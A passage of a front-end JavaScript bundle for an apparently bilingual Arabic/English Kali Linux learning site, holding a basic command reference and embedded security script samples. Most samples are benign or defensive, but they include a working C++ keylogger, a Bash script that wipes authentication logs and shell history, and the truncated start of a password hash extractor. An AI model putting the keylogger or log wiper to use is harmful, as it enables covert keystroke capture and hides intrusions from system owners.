            description: { ar: "حذف ملف", en: "Remove file" },
            icon: l.jsx(Pl, { className: "w-4 h-4" }),
            category: "files",
        },
        {
            command: "rm -rf directory",
            description: { ar: "حذف مجلد بمحتوياته", en: "Remove directory recursively" },
            icon: l.jsx(Pl, { className: "w-4 h-4" }),
            category: "files",
        },
        {
            command: "mkdir dirname",
            description: { ar: "إنشاء مجلد جديد", en: "Create new directory" },
            icon: l.jsx(Cl, { className: "w-4 h-4" }),
            category: "files",
        },
        {
            command: "sudo su",
            description: { ar: "الدخول كمستخدم root", en: "Switch to root user" },
            icon: l.jsx(Tr, { className: "w-4 h-4" }),
            category: "permissions",
        },
        {
            command: "sudo command",
            description: { ar: "تنفيذ أمر كـ root", en: "Execute as root" },
            icon: l.jsx(jc, { className: "w-4 h-4" }),
            category: "permissions",
        },
        {
            command: "whoami",
            description: { ar: "عرض اسم المستخدم الحالي", en: "Display current username" },
            icon: l.jsx(Mc, { className: "w-4 h-4" }),
            category: "permissions",
        },
        {
            command: "chmod 755 file",
            description: { ar: "تغيير صلاحيات الملف", en: "Change file permissions" },
            icon: l.jsx(Tr, { className: "w-4 h-4" }),
            category: "permissions",
        },
        {
            command: "chown user:group file",
            description: { ar: "تغيير مالك الملف", en: "Change file owner" },
            icon: l.jsx(Mc, { className: "w-4 h-4" }),
            category: "permissions",
        },
        {
            command: "passwd",
            description: { ar: "تغيير كلمة المرور", en: "Change password" },
            icon: l.jsx(jc, { className: "w-4 h-4" }),
            category: "permissions",
        },
        {
            command: "uname -a",
            description: { ar: "معلومات النظام الكاملة", en: "Full system information" },
            icon: l.jsx(si, { className: "w-4 h-4" }),
            category: "system",
        },
        {
            command: "df -h",
            description: { ar: "مساحة الأقراص", en: "Disk space usage" },
            icon: l.jsx(Wu, { className: "w-4 h-4" }),
            category: "system",
        },
        {
            command: "free -h",
            description: { ar: "استخدام الذاكرة", en: "Memory usage" },
            icon: l.jsx(ia, { className: "w-4 h-4" }),
            category: "system",
        },
        {
            command: "top",
            description: { ar: "مراقبة العمليات", en: "Monitor processes" },
            icon: l.jsx(si, { className: "w-4 h-4" }),
            category: "system",
        },
        {
            command: "htop",
            description: { ar: "مراقبة متقدمة للعمليات", en: "Advanced process monitor" },
            icon: l.jsx(ia, { className: "w-4 h-4" }),
            category: "system",
        },
        {
            command: "ps aux",
            description: { ar: "عرض كل العمليات", en: "List all processes" },
            icon: l.jsx(jp, { className: "w-4 h-4" }),
            category: "system",
        },
        {
            command: "kill PID",
            description: { ar: "إنهاء عملية بالـ ID", en: "Kill process by ID" },
            icon: l.jsx(ps, { className: "w-4 h-4" }),
            category: "system",
        },
        {
            command: "killall name",
            description: { ar: "إنهاء عملية بالاسم", en: "Kill process by name" },
            icon: l.jsx(ps, { className: "w-4 h-4" }),
            category: "system",
        },
        {
            command: "history",
            description: { ar: "عرض سجل الأوامر", en: "Show command history" },
            icon: l.jsx(kl, { className: "w-4 h-4" }),
            category: "history",
        },
        {
            command: "history | grep keyword",
            description: { ar: "البحث في السجل", en: "Search in history" },
            icon: l.jsx(br, { className: "w-4 h-4" }),
            category: "history",
        },
        {
            command: "find /path -name filename",
            description: { ar: "البحث عن ملف", en: "Find a file" },
            icon: l.jsx(br, { className: "w-4 h-4" }),
            category: "history",
        },
        {
            command: "grep pattern file",
            description: { ar: "البحث داخل ملف", en: "Search in file" },
            icon: l.jsx(br, { className: "w-4 h-4" }),
            category: "history",
        },
        {
            command: "locate filename",
            description: { ar: "بحث سريع عن ملف", en: "Quick file search" },
            icon: l.jsx(Gu, { className: "w-4 h-4" }),
            category: "history",
        },
        {
            command: "ifconfig",
            description: { ar: "عرض إعدادات الشبكة", en: "Network configuration" },
            icon: l.jsx(Jr, { className: "w-4 h-4" }),
            category: "network",
        },
        {
            command: "ip addr",
            description: { ar: "عرض عناوين IP", en: "Show IP addresses" },
            icon: l.jsx(Jr, { className: "w-4 h-4" }),
            category: "network",
        },
        {
            command: "ping host",
            description: { ar: "اختبار الاتصال", en: "Test connectivity" },
            icon: l.jsx(Jr, { className: "w-4 h-4" }),
            category: "network",
        },
        {
            command: "netstat -tuln",
            description: { ar: "عرض المنافذ المفتوحة", en: "Show open ports" },
            icon: l.jsx(Jr, { className: "w-4 h-4" }),
            category: "network",
        },
        {
            command: "wget URL",
            description: { ar: "تحميل ملف من الإنترنت", en: "Download file from URL" },
            icon: l.jsx(sa, { className: "w-4 h-4" }),
            category: "network",
        },
        {
            command: "curl URL",
            description: { ar: "جلب محتوى من رابط", en: "Fetch content from URL" },
            icon: l.jsx(sa, { className: "w-4 h-4" }),
            category: "network",
        },
        {
            command: "apt update",
            description: { ar: "تحديث قائمة الحزم", en: "Update package list" },
            icon: l.jsx(Rp, { className: "w-4 h-4" }),
            category: "packages",
        },
        {
            command: "apt upgrade",
            description: { ar: "ترقية الحزم المثبتة", en: "Upgrade installed packages" },
            icon: l.jsx(Sg, { className: "w-4 h-4" }),
            category: "packages",
        },
        {
            command: "apt install package",
            description: { ar: "تثبيت حزمة جديدة", en: "Install new package" },
            icon: l.jsx(dg, { className: "w-4 h-4" }),
            category: "packages",
        },
        {
            command: "apt remove package",
            description: { ar: "إزالة حزمة", en: "Remove package" },
            icon: l.jsx(Pl, { className: "w-4 h-4" }),
            category: "packages",
        },
        {
            command: "tar -cvf archive.tar files",
            description: { ar: "إنشاء أرشيف tar", en: "Create tar archive" },
            icon: l.jsx(ds, { className: "w-4 h-4" }),
            category: "compression",
        },
        {
            command: "tar -xvf archive.tar",
            description: { ar: "فك أرشيف tar", en: "Extract tar archive" },
            icon: l.jsx(ds, { className: "w-4 h-4" }),
            category: "compression",
        },
        {
            command: "gzip filename",
            description: { ar: "ضغط ملف بـ gzip", en: "Compress with gzip" },
            icon: l.jsx(ds, { className: "w-4 h-4" }),
            category: "compression",
        },
        {
            command: "unzip archive.zip",
            description: { ar: "فك ملف مضغوط", en: "Extract zip file" },
            icon: l.jsx(ds, { className: "w-4 h-4" }),
            category: "compression",
        },
        {
            command: "clear",
            description: { ar: "مسح الشاشة", en: "Clear terminal screen" },
            icon: l.jsx(si, { className: "w-4 h-4" }),
            category: "other",
        },
        {
            command: "exit",
            description: { ar: "الخروج من الطرفية", en: "Exit terminal" },
            icon: l.jsx(ps, { className: "w-4 h-4" }),
            category: "other",
        },
        {
            command: "reboot",
            description: { ar: "إعادة تشغيل النظام", en: "Reboot system" },
            icon: l.jsx(Rp, { className: "w-4 h-4" }),
            category: "other",
        },
        {
            command: "shutdown now",
            description: { ar: "إيقاف النظام", en: "Shutdown system" },
            icon: l.jsx(ps, { className: "w-4 h-4" }),
            category: "other",
        },
        {
            command: "man command",
            description: { ar: "عرض دليل الأمر", en: "Show command manual" },
            icon: l.jsx(In, { className: "w-4 h-4" }),
            category: "other",
        },
        {
            command: "echo text",
            description: { ar: "طباعة نص", en: "Print text" },
            icon: l.jsx(ux, { className: "w-4 h-4" }),
            category: "other",
        },
        {
            command: "date",
            description: { ar: "عرض التاريخ والوقت", en: "Show date and time" },
            icon: l.jsx(kl, { className: "w-4 h-4" }),
            category: "other",
        },
        {
            command: "cal",
            description: { ar: "عرض التقويم", en: "Show calendar" },
            icon: l.jsx(kl, { className: "w-4 h-4" }),
            category: "other",
        },
    ],
    yk = [
        { id: "all", label: { ar: "الكل", en: "All" } },
        { id: "navigation", label: { ar: "التنقل", en: "Navigation" } },
        { id: "listing", label: { ar: "العرض", en: "Listing" } },
        { id: "files", label: { ar: "الملفات", en: "Files" } },
        { id: "permissions", label: { ar: "الصلاحيات", en: "Permissions" } },
        { id: "system", label: { ar: "النظام", en: "System" } },
        { id: "history", label: { ar: "البحث", en: "Search" } },
        { id: "network", label: { ar: "الشبكة", en: "Network" } },
        { id: "packages", label: { ar: "الحزم", en: "Packages" } },
        { id: "compression", label: { ar: "الضغط", en: "Compression" } },
        { id: "other", label: { ar: "أخرى", en: "Other" } },
    ],
    vk = () => {
        const [e, t] = x.useState(null),
            [n, r] = x.useState("ar"),
            [o, i] = x.useState("all"),
            [s, a] = x.useState(""),
            c = (p) => {
                navigator.clipboard.writeText(p), t(p), setTimeout(() => t(null), 2e3);
            },
            u = gk.filter((p) => {
                const m = o === "all" || p.category === o,
                    f =
                        s === "" ||
                        p.command.toLowerCase().includes(s.toLowerCase()) ||
                        p.description[n].toLowerCase().includes(s.toLowerCase());
                return m && f;
            }),
            d = {
                title: n === "ar" ? "أوامر كالي لينكس" : "Kali Linux Commands",
                subtitle: n === "ar" ? "أهم الأوامر الأساسية لنظام كالي لينكس" : "Essential commands for Kali Linux",
                searchPlaceholder: n === "ar" ? "ابحث عن أمر..." : "Search for a command...",
                commandsCount: n === "ar" ? `${u.length} أمر` : `${u.length} commands`,
            };
        return l.jsxs("div", {
            className: "min-h-screen bg-background",
            children: [
                l.jsx(Or, {}),
                l.jsx("main", {
                    className: "pt-24 pb-16",
                    children: l.jsxs("div", {
                        className: "container mx-auto px-4",
                        children: [
                            l.jsxs("div", {
                                className: "text-center mb-12",
                                children: [
                                    l.jsx("div", {
                                        className: "flex justify-center mb-6",
                                        children: l.jsx("div", {
                                            className: "cyber-icon-box",
                                            children: l.jsx(Ar, { className: "w-10 h-10 text-primary" }),
                                        }),
                                    }),
                                    l.jsxs("div", {
                                        className: "flex items-center justify-center gap-3 mb-4",
                                        children: [
                                            l.jsx("h1", {
                                                className: "text-4xl md:text-5xl font-bold text-primary text-glow",
                                                children: d.title,
                                            }),
                                            l.jsx("button", {
                                                onClick: () => r((p) => (p === "ar" ? "en" : "ar")),
                                                className:
                                                    "p-2 rounded-lg bg-secondary border border-border/50 hover:border-primary/50 transition-colors",
                                                children: l.jsx(zi, { className: "w-5 h-5 text-muted-foreground" }),
                                            }),
                                        ],
                                    }),
                                    l.jsx("p", {
                                        className: "text-muted-foreground text-lg max-w-2xl mx-auto",
                                        children: d.subtitle,
                                    }),
                                ],
                            }),
                            l.jsx("div", {
                                className: "max-w-2xl mx-auto mb-8",
                                children: l.jsxs("div", {
                                    className: "relative",
                                    children: [
                                        l.jsx(br, {
                                            className:
                                                "absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-muted-foreground",
                                        }),
                                        l.jsx("input", {
                                            type: "text",
                                            value: s,
                                            onChange: (p) => a(p.target.value),
                                            placeholder: d.searchPlaceholder,
                                            className:
                                                "w-full pl-12 pr-4 py-3 rounded-xl bg-secondary border border-border/50 text-foreground placeholder:text-muted-foreground focus:outline-none focus:border-primary/50 focus:ring-2 focus:ring-primary/20 transition-all",
                                            dir: n === "ar" ? "rtl" : "ltr",
                                        }),
                                    ],
                                }),
                            }),
                            l.jsx("div", {
                                className: "flex flex-wrap justify-center gap-2 mb-8",
                                children: yk.map((p) =>
                                    l.jsx(
                                        "button",
                                        {
                                            onClick: () => i(p.id),
                                            className: `px-4 py-2 rounded-xl text-sm font-medium transition-all ${o === p.id ? "bg-primary text-primary-foreground" : "bg-secondary border border-border/50 text-muted-foreground hover:border-primary/50"}`,
                                            children: n === "ar" ? p.label.ar : p.label.en,
                                        },
                                        p.id
                                    )
                                ),
                            }),
                            l.jsx("div", {
                                className: "text-center mb-6",
                                children: l.jsx("span", {
                                    className: "text-muted-foreground text-sm",
                                    children: d.commandsCount,
                                }),
                            }),
                            l.jsx("div", {
                                className: "max-w-5xl mx-auto",
                                children: l.jsx("div", {
                                    className: "grid grid-cols-1 md:grid-cols-2 gap-4",
                                    children: u.map((p, m) =>
                                        l.jsx(
                                            "div",
                                            {
                                                className:
                                                    "cyber-card p-4 hover:border-primary/50 transition-all group",
                                                children: l.jsxs("div", {
                                                    className: "flex items-start gap-3",
                                                    children: [
                                                        l.jsx("span", {
                                                            className:
                                                                "w-10 h-10 rounded-lg bg-primary/20 text-primary flex items-center justify-center flex-shrink-0",
                                                            children: p.icon,
                                                        }),
                                                        l.jsxs("div", {
                                                            className: "flex-1 min-w-0",
                                                            children: [
                                                                l.jsxs("div", {
                                                                    className: "flex items-center gap-2 mb-2",
                                                                    children: [
                                                                        l.jsx("code", {
                                                                            className:
                                                                                "text-primary text-sm font-mono bg-background/50 px-2 py-1 rounded break-all flex-1",
                                                                            dir: "ltr",
                                                                            children: p.command,
                                                                        }),
                                                                        l.jsx("button", {
                                                                            onClick: () => c(p.command),
                                                                            className:
                                                                                "p-1.5 rounded-lg hover:bg-primary/20 transition-colors opacity-0 group-hover:opacity-100 flex-shrink-0",
                                                                            children:
                                                                                e === p.command
                                                                                    ? l.jsx($u, {
                                                                                          className:
                                                                                              "w-4 h-4 text-primary",
                                                                                      })
                                                                                    : l.jsx(Da, {
                                                                                          className:
                                                                                              "w-4 h-4 text-muted-foreground",
                                                                                      }),
                                                                        }),
                                                                    ],
                                                                }),
                                                                l.jsx("p", {
                                                                    className: "text-muted-foreground text-sm",
                                                                    children:
                                                                        n === "ar"
                                                                            ? p.description.ar
                                                                            : p.description.en,
                                                                }),
                                                            ],
                                                        }),
                                                    ],
                                                }),
                                            },
                                            m
                                        )
                                    ),
                                }),
                            }),
                        ],
                    }),
                }),
                l.jsx(_r, {}),
            ],
        });
    },
    gs = [
        {
            name: { ar: "ماسح المنافذ", en: "Port Scanner" },
            description: { ar: "ماسح منافذ بسيط وسريع", en: "Simple and fast port scanner" },
            language: "Python",
            code: `import socket
from concurrent.futures import ThreadPoolExecutor

def scan_port(target, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((target, port))
        if result == 0:
            print(f"[+] Port {port} is OPEN")
        sock.close()
    except:
        pass

def main():
    target = input("Enter target IP: ")
    print(f"\\nScanning {target}...\\n")
    
    with ThreadPoolExecutor(max_workers=100) as executor:
        for port in range(1, 1025):
            executor.submit(scan_port, target, port)

if __name__ == "__main__":
    main()`,
        },
        {
            name: { ar: "كاسر الهاش", en: "Hash Cracker" },
            description: { ar: "أداة لكسر الهاش باستخدام قائمة كلمات", en: "Hash cracking tool with wordlist" },
            language: "Python",
            code: `import hashlib

def crack_hash(target_hash, wordlist, hash_type="md5"):
    hash_funcs = {
        "md5": hashlib.md5,
        "sha1": hashlib.sha1,
        "sha256": hashlib.sha256
    }
    
    if hash_type not in hash_funcs:
        print("Unsupported hash type")
        return None
    
    with open(wordlist, "r", encoding="utf-8", errors="ignore") as f:
        for word in f:
            word = word.strip()
            hashed = hash_funcs[hash_type](word.encode()).hexdigest()
            if hashed == target_hash:
                print(f"[+] Found: {word}")
                return word
    
    print("[-] Password not found")
    return None

# Usage
# crack_hash("5d41402abc4b2a76b9719d911017c592", "rockyou.txt", "md5")`,
        },
        {
            name: { ar: "مكتشف النطاقات الفرعية", en: "Subdomain Finder" },
            description: { ar: "اكتشاف النطاقات الفرعية", en: "Discover subdomains" },
            language: "Python",
            code: `import requests
import concurrent.futures

subdomains = [
    "www", "mail", "ftp", "admin", "blog", "shop", "api",
    "dev", "test", "staging", "app", "mobile", "cdn", "vpn",
    "portal", "secure", "login", "dashboard", "panel", "cpanel"
]

def check_subdomain(subdomain, domain):
    url = f"http://{subdomain}.{domain}"
    try:
        response = requests.get(url, timeout=3)
        print(f"[+] Found: {url} ({response.status_code})")
        return url
    except:
        return None

def find_subdomains(domain):
    print(f"\\nScanning subdomains for {domain}...\\n")
    found = []
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(check_subdomain, sub, domain): sub for sub in subdomains}
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                found.append(result)
    
    print(f"\\n[*] Found {len(found)} subdomains")
    return found

# Usage: find_subdomains("example.com")`,
        },
        {
            name: { ar: "ماسح الشبكة", en: "Network Scanner" },
            description: { ar: "مسح الأجهزة في الشبكة المحلية", en: "Scan local network devices" },
            language: "Python",
            code: `from scapy.all import ARP, Ether, srp
import sys

def scan_network(ip_range):
    print(f"\\nScanning network: {ip_range}\\n")
    print("-" * 50)
    print(f"{'IP Address':<20} {'MAC Address':<20}")
    print("-" * 50)
    
    # Create ARP request
    arp = ARP(pdst=ip_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp
    
    # Send and receive
    result = srp(packet, timeout=3, verbose=0)[0]
    
    devices = []
    for sent, received in result:
        devices.append({
            'ip': received.psrc,
            'mac': received.hwsrc
        })
        print(f"{received.psrc:<20} {received.hwsrc:<20}")
    
    print("-" * 50)
    print(f"\\n[*] Found {len(devices)} devices")
    return devices

# Usage: scan_network("192.168.1.0/24")`,
        },
        {
            name: { ar: "كاشف Keylogger", en: "Keylogger Detector" },
            description: { ar: "كشف برامج التجسس على لوحة المفاتيح", en: "Detect keyboard spyware" },
            language: "Python",
            code: `import psutil
import os

suspicious_names = [
    "keylogger", "logger", "hook", "capture", "spy",
    "monitor", "record", "keystroke", "input"
]

def detect_keyloggers():
    print("\\n[*] Scanning for suspicious processes...\\n")
    
    suspicious = []
    for proc in psutil.process_iter(['pid', 'name', 'exe']):
        try:
            name = proc.info['name'].lower()
            for keyword in suspicious_names:
                if keyword in name:
                    suspicious.append({
                        'pid': proc.info['pid'],
                        'name': proc.info['name'],
                        'path': proc.info['exe']
                    })
                    break
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue
    
    if suspicious:
        print("[!] Suspicious processes found:")
        for proc in suspicious:
            print(f"  PID: {proc['pid']}, Name: {proc['name']}")
            print(f"  Path: {proc['path']}\\n")
    else:
        print("[+] No suspicious keylogger processes detected")
    
    return suspicious

detect_keyloggers()`,
        },
        {
            name: { ar: "مولد كلمات المرور", en: "Password Generator" },
            description: { ar: "توليد كلمات مرور قوية", en: "Generate strong passwords" },
            language: "Python",
            code: `import random
import string

def generate_password(length=16, use_special=True):
    chars = string.ascii_letters + string.digits
    if use_special:
        chars += string.punctuation
    
    password = ''.join(random.SystemRandom().choice(chars) for _ in range(length))
    return password

def generate_wordlist(count=100, min_len=8, max_len=16):
    wordlist = []
    for _ in range(count):
        length = random.randint(min_len, max_len)
        wordlist.append(generate_password(length))
    return wordlist

# Generate 5 passwords
print("Generated Passwords:")
for i in range(5):
    print(f"  {i+1}. {generate_password(20)}")`,
        },
        {
            name: { ar: "مستخرج البريد الإلكتروني", en: "Email Extractor" },
            description: { ar: "استخراج الإيميلات من صفحات الويب", en: "Extract emails from web pages" },
            language: "Python",
            code: `import re
import requests
from bs4 import BeautifulSoup

def extract_emails(url):
    try:
        response = requests.get(url, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        text = soup.get_text()
        
        email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+.[a-zA-Z]{2,}'
        emails = set(re.findall(email_pattern, text))
        
        print(f"\\n[*] Found {len(emails)} emails on {url}:\\n")
        for email in sorted(emails):
            print(f"  {email}")
        
        return list(emails)
    except Exception as e:
        print(f"Error: {e}")
        return []

# Usage: extract_emails("https://example.com")`,
        },
        {
            name: { ar: "فاحص الروابط", en: "URL Checker" },
            description: { ar: "فحص حالة الروابط والسيرفرات", en: "Check URL and server status" },
            language: "Python",
            code: `import requests
import ssl
import socket

def check_url(url):
    print(f"\\n[*] Checking {url}...\\n")
    
    try:
        response = requests.get(url, timeout=10, allow_redirects=True)
        print(f"[+] Status Code: {response.status_code}")
        print(f"[+] Final URL: {response.url}")
        print(f"[+] Server: {response.headers.get('Server', 'Unknown')}")
        print(f"[+] Content-Type: {response.headers.get('Content-Type', 'Unknown')}")
        
        # Check SSL
        if url.startswith('https'):
            hostname = url.split('/')[2]
            ctx = ssl.create_default_context()
            with ctx.wrap_socket(socket.socket(), server_hostname=hostname) as s:
                s.connect((hostname, 443))
                cert = s.getpeercert()
                print(f"[+] SSL Valid Until: {cert['notAfter']}")
        
        return response.status_code
    except Exception as e:
        print(f"[-] Error: {e}")
        return None

# Usage: check_url("https://google.com")`,
        },
        {
            name: { ar: "ماسح المنافذ (C++)", en: "Port Scanner (C++)" },
            description: { ar: "ماسح منافذ سريع بلغة C++", en: "Fast port scanner in C++" },
            language: "C++",
            code: `#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <thread>
#include <vector>

#pragma comment(lib, "ws2_32.lib")

void scan_port(const char* ip, int port) {
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) return;
    
    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &addr.sin_addr);
    
    DWORD timeout = 1000;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
    
    if (connect(sock, (sockaddr*)&addr, sizeof(addr)) == 0) {
        std::cout << "[+] Port " << port << " is OPEN" << std::endl;
    }
    closesocket(sock);
}

int main() {
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);
    
    std::string target;
    std::cout << "Enter target IP: ";
    std::cin >> target;
    
    std::cout << "\\nScanning " << target << "...\\n" << std::endl;
    
    std::vector<std::thread> threads;
    for (int port = 1; port <= 1024; port++) {
        threads.emplace_back(scan_port, target.c_str(), port);
    }
    
    for (auto& t : threads) t.join();
    
    WSACleanup();
    return 0;
}`,
        },
        {
            name: { ar: "مولد كلمات المرور (C++)", en: "Password Generator (C++)" },
            description: { ar: "مولد كلمات مرور قوية", en: "Strong password generator" },
            language: "C++",
            code: `#include <iostream>
#include <string>
#include <random>
#include <ctime>

std::string generate_password(int length, bool upper, bool lower, 
                               bool digits, bool special) {
    std::string charset = "";
    if (upper)   charset += "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    if (lower)   charset += "abcdefghijklmnopqrstuvwxyz";
    if (digits)  charset += "0123456789";
    if (special) charset += "!@#$%^&*()_+-=[]{}|;:,.<>?";
    
    if (charset.empty()) {
        return "Error: No character set selected";
    }
    
    std::mt19937 rng(std::time(nullptr));
    std::uniform_int_distribution<int> dist(0, charset.length() - 1);
    
    std::string password = "";
    for (int i = 0; i < length; i++) {
        password += charset[dist(rng)];
    }
    
    return password;
}

int main() {
    int length;
    std::cout << "Password length: ";
    std::cin >> length;
    
    std::cout << "\\nGenerated passwords:\\n" << std::endl;
    
    for (int i = 0; i < 5; i++) {
        std::string pwd = generate_password(length, true, true, true, true);
        std::cout << "  " << i+1 << ". " << pwd << std::endl;
    }
    
    return 0;
}`,
        },
        {
            name: { ar: "مشفر الملفات (C++)", en: "File Encryptor (C++)" },
            description: { ar: "تشفير الملفات باستخدام XOR", en: "XOR file encryption" },
            language: "C++",
            code: `#include <iostream>
#include <fstream>
#include <string>
#include <vector>

void xor_encrypt(const std::string& input_file, 
                 const std::string& output_file,
                 const std::string& key) {
    std::ifstream in(input_file, std::ios::binary);
    std::ofstream out(output_file, std::ios::binary);
    
    if (!in.is_open() || !out.is_open()) {
        std::cerr << "Error opening files!" << std::endl;
        return;
    }
    
    char byte;
    size_t key_index = 0;
    
    while (in.get(byte)) {
        byte ^= key[key_index % key.length()];
        out.put(byte);
        key_index++;
    }
    
    in.close();
    out.close();
    
    std::cout << "[+] File encrypted successfully!" << std::endl;
    std::cout << "[*] Output: " << output_file << std::endl;
}

int main() {
    std::string input, output, key;
    
    std::cout << "Input file: ";
    std::cin >> input;
    
    std::cout << "Output file: ";
    std::cin >> output;
    
    std::cout << "Encryption key: ";
    std::cin >> key;
    
    xor_encrypt(input, output, key);
    
    return 0;
}`,
        },
        {
            name: { ar: "Keylogger بسيط (C++)", en: "Simple Keylogger (C++)" },
            description: { ar: "مسجل ضغطات لوحة المفاتيح للتعليم", en: "Educational keyboard logger" },
            language: "C++",
            code: `#include <iostream>
#include <fstream>
#include <windows.h>

// WARNING: For educational purposes only!
// Use only on systems you own or have permission to test.

std::string get_key_name(int key) {
    switch(key) {
        case VK_SPACE: return " ";
        case VK_RETURN: return "[ENTER]\\n";
        case VK_BACK: return "[BACKSPACE]";
        case VK_TAB: return "[TAB]";
        case VK_SHIFT: return "";
        case VK_CONTROL: return "[CTRL]";
        case VK_CAPITAL: return "[CAPS]";
        case VK_ESCAPE: return "[ESC]";
        default:
            if (key >= 0x30 && key <= 0x5A) {
                char c = MapVirtualKey(key, MAPVK_VK_TO_CHAR);
                if (!(GetKeyState(VK_SHIFT) & 0x8000) && c >= 'A' && c <= 'Z')
                    c += 32; // lowercase
                return std::string(1, c);
            }
            return "";
    }
}

int main() {
    std::ofstream log("keylog.txt", std::ios::app);
    
    std::cout << "[*] Keylogger started (Press ESC to stop)" << std::endl;
    std::cout << "[*] Logging to keylog.txt" << std::endl;
    
    while (true) {
        for (int key = 8; key <= 255; key++) {
            if (GetAsyncKeyState(key) == -32767) {
                std::string output = get_key_name(key);
                if (!output.empty()) {
                    std::cout << output;
                    log << output;
                    log.flush();
                }
                if (key == VK_ESCAPE) {
                    log.close();
                    return 0;
                }
            }
        }
        Sleep(10);
    }
    return 0;
}`,
        },
        {
            name: { ar: "جامع معلومات النظام", en: "System Info Collector" },
            description: { ar: "جمع معلومات النظام", en: "Collect system information" },
            language: "Bash",
            code: `#!/bin/bash

echo "========================================="
echo "       SYSTEM INFORMATION COLLECTOR      "
echo "========================================="
echo ""

echo "[+] Hostname: $(hostname)"
echo "[+] User: $(whoami)"
echo "[+] OS: $(uname -a)"
echo ""

echo "[+] Network Interfaces:"
ip addr | grep -E "inet " | awk '{print "    " $2}'
echo ""

echo "[+] Open Ports:"
netstat -tuln 2>/dev/null | grep LISTEN | awk '{print "    " $4}'
echo ""

echo "[+] Running Services:"
systemctl list-units --type=service --state=running | head -20
echo ""

echo "[+] Last 5 Logins:"
last -5
echo ""

echo "[+] Disk Usage:"
df -h | grep -E "^/dev"
echo ""

echo "========================================="
echo "          Scan Complete                  "
echo "========================================="`,
        },
        {
            name: { ar: "نسخ احتياطي للجدار الناري", en: "Firewall Backup" },
            description: { ar: "نسخ احتياطي لقواعد الجدار الناري", en: "Backup firewall rules" },
            language: "Bash",
            code: `#!/bin/bash

BACKUP_DIR="/backup/firewall"
DATE=$(date +%Y%m%d_%H%M%S)
BACKUP_FILE="$BACKUP_DIR/iptables_backup_$DATE.rules"

# Create backup directory
mkdir -p $BACKUP_DIR

echo "[*] Creating firewall rules backup..."

# Backup iptables rules
iptables-save > $BACKUP_FILE

if [ $? -eq 0 ]; then
    echo "[+] Backup created: $BACKUP_FILE"
    echo "[+] File size: $(ls -lh $BACKUP_FILE | awk '{print $5}')"
    
    # Keep only last 10 backups
    cd $BACKUP_DIR
    ls -t | tail -n +11 | xargs -r rm --
    echo "[+] Old backups cleaned"
else
    echo "[-] Backup failed!"
    exit 1
fi

echo ""
echo "[*] Current rules count:"
echo "    IPv4: $(iptables -L -n | grep -c '^')"
echo "    IPv6: $(ip6tables -L -n | grep -c '^')"`,
        },
        {
            name: { ar: "ماسح الشبكة (Bash)", en: "Network Scanner (Bash)" },
            description: { ar: "مسح الشبكة المحلية", en: "Scan local network" },
            language: "Bash",
            code: `#!/bin/bash

if [ -z "$1" ]; then
    echo "Usage: $0 <network> (e.g., 192.168.1)"
    exit 1
fi

NETWORK=$1

echo "========================================="
echo "       NETWORK SCANNER                   "
echo "========================================="
echo ""
echo "[*] Scanning network: $NETWORK.0/24"
echo ""

for ip in $(seq 1 254); do
    (
        ping -c 1 -W 1 $NETWORK.$ip &>/dev/null
        if [ $? -eq 0 ]; then
            echo "[+] Host found: $NETWORK.$ip"
            # Get hostname if possible
            hostname=$(host $NETWORK.$ip 2>/dev/null | grep "domain name pointer" | awk '{print $5}')
            if [ ! -z "$hostname" ]; then
                echo "    Hostname: $hostname"
            fi
        fi
    ) &
done

wait
echo ""
echo "[*] Scan complete"`,
        },
        {
            name: { ar: "مراقب العمليات", en: "Process Monitor" },
            description: { ar: "مراقبة العمليات المشبوهة", en: "Monitor suspicious processes" },
            language: "Bash",
            code: `#!/bin/bash

echo "========================================="
echo "       PROCESS MONITOR                   "
echo "========================================="

SUSPICIOUS=("nc" "ncat" "netcat" "python" "perl" "ruby" "bash -i" "sh -i")

echo ""
echo "[*] Checking for suspicious processes..."
echo ""

for proc in "\${SUSPICIOUS[@]}"; do
    result=$(ps aux | grep -i "$proc" | grep -v grep)
    if [ ! -z "$result" ]; then
        echo "[!] Suspicious process found: $proc"
        echo "$result" | while read line; do
            echo "    $line"
        done
        echo ""
    fi
done

echo ""
echo "[*] Network connections (ESTABLISHED):"
netstat -tunapl 2>/dev/null | grep ESTABLISHED | head -10

echo ""
echo "[*] Listening ports:"
netstat -tunapl 2>/dev/null | grep LISTEN | head -10

echo ""
echo "[*] Scan complete"`,
        },
        {
            name: { ar: "منظف السجلات", en: "Log Cleaner" },
            description: { ar: "تنظيف سجلات النظام", en: "Clean system logs" },
            language: "Bash",
            code: `#!/bin/bash

# WARNING: Use only on systems you own!
# For educational purposes only.

echo "========================================="
echo "       LOG CLEANER                       "
echo "========================================="

if [ "$(id -u)" -ne 0 ]; then
    echo "[-] This script must be run as root"
    exit 1
fi

LOG_FILES=(
    "/var/log/auth.log"
    "/var/log/syslog"
    "/var/log/messages"
    "/var/log/secure"
    "/var/log/wtmp"
    "/var/log/btmp"
    "/var/log/lastlog"
)

echo ""
echo "[*] Clearing log files..."

for log in "\${LOG_FILES[@]}"; do
    if [ -f "$log" ]; then
        echo -n > "$log" 2>/dev/null
        echo "[+] Cleared: $log"
    fi
done

# Clear bash history
echo "[+] Clearing bash history..."
history -c
cat /dev/null > ~/.bash_history

echo ""
echo "[*] Log cleanup complete"`,
        },
        {
            name: { ar: "مستخرج كلمات المرور", en: "Password Extractor" },
            description: { ar: "استخراج الهاشات من النظام", en: "Extract system hashes" },
            language: "Bash",
            code: `#!/bin/bash

# WARNING: Educational purposes only!
# Only use on systems you have permission to test.

echo "========================================="
echo "       PASSWORD HASH EXTRACTOR           "
echo "========================================="

